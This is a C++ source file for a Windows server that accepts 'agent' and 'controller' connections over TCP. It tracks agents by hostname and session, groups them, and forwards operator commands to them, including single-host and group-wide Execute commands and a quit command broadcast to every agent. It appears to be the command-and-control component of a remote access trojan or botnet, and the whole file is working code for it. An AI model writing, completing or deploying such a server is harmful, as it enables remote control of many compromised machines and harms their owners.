#include "Server.hpp"

Server::~Server() {
    for (AgentConnection* conn : arrAgentConnections) {
        delete conn;
    }

    for (ControllerConnection* conn : arrControllerConnections) {
        delete conn;
    }
}


INT Server::StartServer() {
    WSADATA wsaData;
    SOCKET arrListeningSockets[2];
    std::thread arrThreads[2];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    CreateListeningSocket(CONTROLLER_PORT, arrListeningSockets[0]);
    CreateListeningSocket(AGENT_PORT, arrListeningSockets[1]);

    bIsRunning = TRUE;
    arrThreads[0] = std::thread(&Server::ListenForConnections, this, CONTROLLER_PORT, arrListeningSockets[0]);
    arrThreads[1] = std::thread(&Server::ListenForConnections, this , AGENT_PORT, arrListeningSockets[1]);

    std::cout << "[+] Listening for controllers on port " << CONTROLLER_PORT << "\n";
    std::cout << "[+] Listening for agents on port "<< AGENT_PORT <<"\n";

    arrThreads[0].join();
    arrThreads[1].join();
    WSACleanup();

    return 0;
}


BOOL Server::CreateListeningSocket(INT iPort, SOCKET& outSocket) {

    outSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (outSocket == INVALID_SOCKET)
        return FALSE;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(iPort);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(outSocket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR ||
        listen(outSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        closesocket(outSocket);
        outSocket = INVALID_SOCKET;
        return FALSE;
    }

    return TRUE;
}


BOOL Server::ListenForConnections(INT iPort, SOCKET listeningSocket)
{
    INT nSocketReadResult;
    INT iFdSetIndex = (iPort == AGENT_PORT) ? 1 : 0;

    InitMasterSet(iFdSetIndex);
    AddSocketToMaster(listeningSocket, iFdSetIndex);

    while (bIsRunning) {
        SetReadSetAsMaster(iFdSetIndex);
        nSocketReadResult = WaitForSocketRead(iFdSetIndex);

        if (nSocketReadResult == SOCKET_ERROR) {
            std::cerr << "select() failed\n";
            break;
        }

        // Check for new connections:
        AcceptNewConnections(listeningSocket, iFdSetIndex);

        // Check for closed connections or new data:
        if (iPort == AGENT_PORT) {
            CheckForAgentConnections();
        }
        else {
            CheckForControllerConnections();
        }
    }

    return TRUE;
}

VOID Server::AcceptNewConnections(SOCKET listeningSocket, INT iFdSetIndex)
{
    INT nAddrLen;
    sockaddr_in clientAddr;
    nAddrLen = sizeof(clientAddr);

    if (IsSocketInSet(listeningSocket, iFdSetIndex)) {
        SOCKET clientSocket = accept(listeningSocket, (sockaddr*)&clientAddr, &nAddrLen);

        if (clientSocket != INVALID_SOCKET) {
            if (iFdSetIndex == AGENT_INDEX)
            {
                AddAgentConnection(clientSocket);
            }
            else {
                AddControllerConnection(clientSocket);
            }
        }
    }
}


INT Server::AssignSession(std::string szHostName)
{
    INT iMaxSession = 0;

    for (AgentConnection* conn : arrAgentConnections) {
        if (conn->GetHostName() == szHostName && conn->GetSession() > iMaxSession) {
            iMaxSession = conn->GetSession();
        }
    }

    return iMaxSession + 1;

}

VOID Server::CheckForAgentConnections()
{
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
        AgentConnection* conn = *connectionsIterator;

        if (IsSocketInSet(conn->GetSocket(), AGENT_INDEX)) {
            std::string szData;
            BOOL bIsConnectionAlive;
            bIsConnectionAlive = conn->ReceiveData(szData);

            if (!bIsConnectionAlive) {
                connectionsIterator = RemoveAgentConnection(connectionsIterator);
            }
            else {
                if (!szData.empty()) {
                    if (conn->GetSession() != 0) {
                        conn->EnqueueIncomingData(szData);
                    }
                    else {
                        INT iSession = AssignSession(szData);
                        conn->SetSession(iSession);
                        conn->SetHostName(szData);
                    }
                }

                ++connectionsIterator;
            }
        }
        else {
            ++connectionsIterator;
        }
    }
}


VOID Server::CheckForControllerConnections()
{
    std::lock_guard<std::mutex> lock(mControllerConnectionsMutex);

    for (auto connectionsIterator = arrControllerConnections.begin(); connectionsIterator != arrControllerConnections.end();) {
        ControllerConnection* conn = *connectionsIterator;

        if (IsSocketInSet(conn->GetSocket(), CONTROLLER_INDEX)) {
            std::string szData;
            BOOL bIsConnectionAlive;
            bIsConnectionAlive = conn->ReceiveData(szData);

            if (!bIsConnectionAlive) {
                connectionsIterator = RemoveControllerConnection(connectionsIterator);
            }
            else {
                if (!szData.empty()) {
                    HandleControllerCommand(szData, conn);
                }

                ++connectionsIterator;
            }
        }
        else {
            ++connectionsIterator;
        }
    }
}


VOID Server::AddAgentConnection(SOCKET socket) {
    AgentConnection* agentConn = new AgentConnection(socket);
    arrAgentConnections.push_back(agentConn);
    AddSocketToMaster(socket, AGENT_INDEX);
}

VOID Server::AddControllerConnection(SOCKET socket) {
    ControllerConnection* controllerCon = new ControllerConnection(socket);
    arrControllerConnections.push_back(controllerCon);
    AddSocketToMaster(socket, CONTROLLER_INDEX);
}

std::vector<AgentConnection*>::iterator Server::RemoveAgentConnection(std::vector<AgentConnection*>::iterator& connectionIterator) {
    RemoveConnectionFromAllGroups(*connectionIterator);
    RemoveSocketFromSet((*connectionIterator)->GetSocket(), AGENT_INDEX);
    delete *connectionIterator;
    auto iterator = arrAgentConnections.erase(connectionIterator);

    return iterator;
}


std::vector<ControllerConnection*>::iterator Server::RemoveControllerConnection(std::vector<ControllerConnection*>::iterator& connectionIterator) {
    RemoveSocketFromSet((*connectionIterator)->GetSocket(), CONTROLLER_INDEX);
    delete* connectionIterator;
    auto iterator = arrControllerConnections.erase(connectionIterator);

    return iterator;
}

VOID Server::HandleControllerCommand(std::string szData, ControllerConnection* conn)
{
    BOOL bIsCommandSuccess;
    std::string szResponse;
    const nlohmann::json jsonData = nlohmann::json::parse(szData);
    ControllerCommandReq controllerCommand = jsonData;

    switch (controllerCommand.GetCommandType()) {
    case CommandType::Quit:
        bIsRunning = FALSE;
        DeleteAgentConnectionsFiles();
        szResponse = "[*] Successfully killed server process\n";
        break;

    case CommandType::Close: {
        bIsCommandSuccess = CloseConnection(controllerCommand.GetTargetAgent());

        if (bIsCommandSuccess) {
            szResponse = "[*] Successfully closed connection with " + controllerCommand.GetTargetAgent() + "\n";
        }
        else {
            szResponse = "[!] Error closing connection with " + controllerCommand.GetTargetAgent() + "\n";
        }
        break;
    }
    case CommandType::List:
        szResponse = GetActiveAgentSockets();
        break;

    case CommandType::GroupAdd: {
        AgentConnection* agentConn;
        auto connectionIterator = FindConnectionFromSocketStr(controllerCommand.GetTargetAgent());

        if (connectionIterator != arrAgentConnections.end()) {
            agentConn = *connectionIterator;
            groupManager.AddConnectionToGroup(controllerCommand.GetGroupName(), agentConn);
            szResponse = "[*] Successfully added " + controllerCommand.GetTargetAgent() + " to " +
                controllerCommand.GetGroupName() + " group\n";
        }
        else {
            szResponse = "[!] Agent " + controllerCommand.GetTargetAgent() + " does not exist\n";
        }
        break;
    }

    case CommandType::GroupCreate:
        bIsCommandSuccess = groupManager.CreateGroup(controllerCommand.GetGroupName());

        if (!bIsCommandSuccess) {
            szResponse = "[!] Group " + controllerCommand.GetGroupName() + " already exists\n";
        }
        else {
            szResponse = "[*] Successfully created group " + controllerCommand.GetGroupName() + "\n";
        }
        break;

    case CommandType::GroupDelete:
        bIsCommandSuccess = groupManager.DeleteGroup(controllerCommand.GetGroupName());

        if (!bIsCommandSuccess) {
            szResponse = "[!] Group " + controllerCommand.GetGroupName() + " doesn't exist\n";
        }
        else {
            szResponse = "[*] Successfully deleted group " + controllerCommand.GetGroupName() + "\n";
        }
        break;

    case CommandType::GroupRemove: {
        AgentConnection* agentConn;
        auto connectionIterator = FindConnectionFromSocketStr(controllerCommand.GetTargetAgent());

        if (connectionIterator != arrAgentConnections.end()) {
            agentConn = *connectionIterator;
            bIsCommandSuccess = groupManager.RemoveConnectionFromGroup(controllerCommand.GetGroupName(), agentConn);

            if (bIsCommandSuccess) {
                szResponse = "[*] Successfully removed " + controllerCommand.GetTargetAgent() + " to " +
                    controllerCommand.GetGroupName() + " group\n";
            }
            else {
                szResponse = "[!] Group " + controllerCommand.GetGroupName() + " doesn't exist\n";
            }
        }
        else {
            szResponse = "[!] Agent " + controllerCommand.GetTargetAgent() + " does not exist\n";
        }
        break;
    }

    case CommandType::ListGroup:
        bIsCommandSuccess = groupManager.ListGroupMembers(controllerCommand.GetGroupName(), szResponse);
        break;

    case CommandType::ListGroupNames:
        groupManager.GetGroupNames(szResponse);
        break;

    case CommandType::OpenCmdWindow:
        if (groupManager.CheckGroupExists(controllerCommand.GetGroupName()) ||
            FindConnectionFromSocketStr(controllerCommand.GetTargetAgent()) != arrAgentConnections.end())
        {
            szResponse = "Found";
        }
        else {
            szResponse = "Not found";
        }
        break;

    case CommandType::Execute: {
        auto connectionIterator = FindConnectionFromSocketStr(controllerCommand.GetTargetAgent());

        if (connectionIterator != arrAgentConnections.end()) {
            (*connectionIterator)->SendData(controllerCommand.GetParameters());
            (*connectionIterator)->GetDataFromQueue(szResponse, -1);
        }
        else {
            szResponse = "Connection Lost";
        }
        break;
    }

    case CommandType::GroupExecute: {
        BOOL bIsGroupExists = groupManager.CheckGroupExists(controllerCommand.GetGroupName());

        if (bIsGroupExists) {
            groupManager.BroadcastToGroup(controllerCommand.GetGroupName(), controllerCommand.GetParameters(), szResponse);
        }
        else {
            szResponse = "[!] Group " + controllerCommand.GetGroupName() + " doesn't exist\n";
        }
        break;
    }

    default:
        szResponse = "[!] Server error occurred\n";
        break;
    }

    conn->SendData(szResponse);
}


std::string Server::GetActiveAgentSockets() {
    std::string szResult;

    if (arrAgentConnections.size() == 0) {
        szResult = "[+] No active sockets\n";
    }
    else {
        szResult = "[+] Active sockets:\n";

        for (AgentConnection* conn : arrAgentConnections) {
            szResult += "[+] IP: " + conn->GetSocketStr() + " | Host: " + conn->GetHostNameSessionStr() + "\n";
        }
    }

    return szResult;
}


std::vector<AgentConnection*>::iterator Server::FindConnectionFromSocketStr(std::string szSocket) {
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end(); ++connectionsIterator) {
        AgentConnection* conn = *connectionsIterator;

        if (conn->GetSocketStr() == szSocket || conn->GetHostNameSessionStr() == szSocket) {
            return connectionsIterator;
        }
    }

    return arrAgentConnections.end();
}

VOID Server::DeleteAgentConnectionsFiles()
{
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    for (AgentConnection* conn : arrAgentConnections) {
        conn->SendData(QUIT_COMMAND);
    }
}

VOID Server::RemoveConnectionFromAllGroups(AgentConnection* conn)
{
    auto arrGroups = conn->GetGroups();
    for (auto group : arrGroups) {
        groupManager.RemoveConnectionFromGroup(group, conn);
    }
}


BOOL Server::CloseConnection(std::string szSocket) {
    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    if (connectionsIterator != arrAgentConnections.end()) {
        RemoveAgentConnection(connectionsIterator);
        return TRUE;
    }

    return FALSE;
}


fd_set Server::GetMasterSet(INT iFdSetIndex) {
    return masterSet[iFdSetIndex];
}

fd_set Server::GetReadSet(INT iFdSetIndex) {
    return readSet[iFdSetIndex];
}
VOID Server::InitMasterSet(INT iFdSetIndex) {
    FD_ZERO(&masterSet[iFdSetIndex]);
}


VOID Server::SetReadSetAsMaster(INT iFdSetIndex) {
    readSet[iFdSetIndex] = masterSet[iFdSetIndex];
}


VOID Server::AddSocketToMaster(SOCKET socket, INT iFdSetIndex) {
    FD_SET(socket, &masterSet[iFdSetIndex]);
}


INT Server::WaitForSocketRead(INT iFdSetIndex) {
    timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    return select(0, &readSet[iFdSetIndex], NULL, NULL, &timeout);
}


BOOL Server::IsSocketInSet(SOCKET socket, INT iFdSetIndex) {
    return FD_ISSET(socket, &readSet[iFdSetIndex]);
}


VOID Server::RemoveSocketFromSet(SOCKET socket, INT iFdSetIndex) {
    FD_CLR(socket, &masterSet[iFdSetIndex]);
}
